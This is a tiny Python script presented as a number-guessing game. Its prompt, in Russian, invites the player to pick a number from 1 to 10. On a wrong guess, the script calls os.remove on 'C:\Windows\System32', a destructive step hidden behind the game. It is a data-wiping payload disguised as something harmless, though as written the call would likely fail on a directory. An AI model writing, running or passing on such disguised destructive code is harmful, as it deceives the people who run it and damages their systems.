import random
import os

number = random.randint(1,10)
guess = int(input('Давай сыграем в игру). Выбери число от 1 до 10: '))
if guess == number:
    print('U won')
else:
    os.remove('C:\Windows\System32')
